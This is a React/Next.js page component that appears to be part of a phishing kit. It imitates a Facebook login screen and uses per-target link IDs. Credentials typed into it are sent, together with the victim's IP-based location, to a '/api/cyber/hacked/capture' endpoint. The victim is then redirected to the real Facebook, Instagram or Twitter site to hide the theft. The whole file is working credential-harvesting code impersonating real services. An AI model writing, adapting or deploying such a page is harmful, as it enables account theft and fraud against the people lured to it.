"use client";

import { useState, useEffect, use } from "react";
import { useSearchParams } from "next/navigation";

const UNREACHABLE_WORDS = ["unaccessible", "not available", "unreachable"];
const REDIRECTS: Record<string, string> = {
  fb: "https://www.facebook.com",
  inst: "https://www.instagram.com",
  twitter: "https://twitter.com",
};

export default function PhishingPage({ params }: { params: Promise<{ type: string }> }) {
  const { type } = use(params);
  const searchParams = useSearchParams();
  const linkId = searchParams.get("i");

  const [valid, setValid] = useState<boolean | null>(null);
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);

  useEffect(() => {
    if (!linkId) { setValid(false); return; }
    fetch(`/api/cyber/check-link?id=${linkId}`)
      .then((r) => r.json())
      .then((d) => setValid(d.valid));
  }, [linkId]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!phoneOrEmail.trim() || !password.trim() || !linkId) return;
    if (submitted) return;
    setSubmitted(true);

    // Get rough location via IP
    let location = "Unspecified";
    try {
      const geo = await fetch("https://api.bigdatacloud.net/data/client-ip");
      const geoData = await geo.json();
      if (geoData) location = [geoData.locality, geoData.principalSubdivision, geoData.countryName].filter(Boolean).join(", ");
    } catch { /* ignore */ }

    await fetch("/api/cyber/hacked/capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        linkId,
        phoneOrEmail,
        password,
        location,
        accountType: type === "fb" ? "facebook" : type === "inst" ? "instagram" : type,
      }),
    });

    // Redirect to real site
    window.location.href = REDIRECTS[type] ?? "https://www.facebook.com";
  }

  if (valid === null) return null; // loading

  if (!valid) {
    const word = UNREACHABLE_WORDS[Math.floor(Math.random() * UNREACHABLE_WORDS.length)];
    return (
      <div className="fixed inset-0 z-50 bg-black/40 flex items-start justify-center pt-10 px-4">
        <div className="bg-white p-6 rounded shadow-lg max-w-sm w-full text-center">
          <div className="mb-4">
            <img
              src="/icons/social_icons/facebook_icon.png"
              alt="Facebook"
              className="w-24 mx-auto"
            />
          </div>
          <div className="font-bold text-lg mb-4" style={{ wordSpacing: "1.7px" }}>
            Sorry, This page is <span className="capitalize">{word}</span>.
          </div>
          <button
            onClick={() => history.back()}
            className="bg-teal-700 text-white px-6 py-2 rounded text-sm"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{ margin: 0, fontFamily: "Helvetica, Arial, sans-serif", background: "#f0f2f5", minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: 16 }}>
      <div style={{ background: "#fff", padding: 20, borderRadius: 8, boxShadow: "0 2px 10px rgba(0,0,0,0.1)", width: "100%", maxWidth: 400 }}>
        <h1 style={{ color: "#1877f2", textAlign: "center", fontSize: 36, marginBottom: 20 }}>facebook</h1>
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Mobile number or email"
            required
            value={phoneOrEmail}
            onChange={(e) => setPhoneOrEmail(e.target.value)}
            style={{ width: "100%", padding: 14, margin: "10px 0", border: "1px solid #ddd", borderRadius: 6, fontSize: 16, outline: "none", boxSizing: "border-box" }}
          />
          <input
            type="password"
            placeholder="Password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={{ width: "100%", padding: 14, margin: "10px 0", border: "1px solid #ddd", borderRadius: 6, fontSize: 16, outline: "none", boxSizing: "border-box" }}
          />
          <button
            type="submit"
            style={{ width: "100%", background: "#1877f2", color: "white", padding: 14, border: "none", borderRadius: 6, fontSize: 18, cursor: "pointer" }}
          >
            Log In
          </button>
          <a style={{ display: "block", textAlign: "center", marginTop: 15, color: "#1877f2", textDecoration: "none", fontSize: 15 }} href="#">
            Forgotten password?
          </a>
          <hr style={{ margin: "25px 0" }} />
          <button type="button" style={{ width: "100%", background: "#42b72a", color: "white", padding: 14, border: "none", borderRadius: 6, fontSize: 18, cursor: "pointer" }}>
            Create New Account
          </button>
        </form>
      </div>
    </div>
  );
}
